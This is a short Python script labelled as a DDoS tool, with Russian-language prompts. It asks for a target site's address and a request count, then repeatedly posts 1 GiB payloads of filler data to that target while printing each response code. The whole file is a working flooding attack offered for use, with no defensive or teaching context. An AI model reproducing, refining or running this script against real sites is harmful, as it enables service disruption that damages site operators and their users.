from pyfiglet import Figlet
import requests

def ddos_attack(url, count_request):    
    for i in range(count_request):
        try:

            data = "A" * 1024 * 1024 * 1024  
            response = requests.post(url, data=data)
            print(f"Запрос {i+1} отправлен. Код ответа: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Ошибка при отправке запроса {i+1}: {e}")

if __name__ == "__main__":
    preview_text = Figlet(font='slant')
    print(preview_text.renderText('DDOZ ZED'))

    url = input("Укажите ip адрес сайта который является целью: ")
    count_request = int(input("Укажите количество запросов: "))
    print("Рекомендуется не завершать программу и не выключать устройство во время работы!")

    ddos_attack(url, count_request)
    print("Все запросы отправлены!")
 

  
 


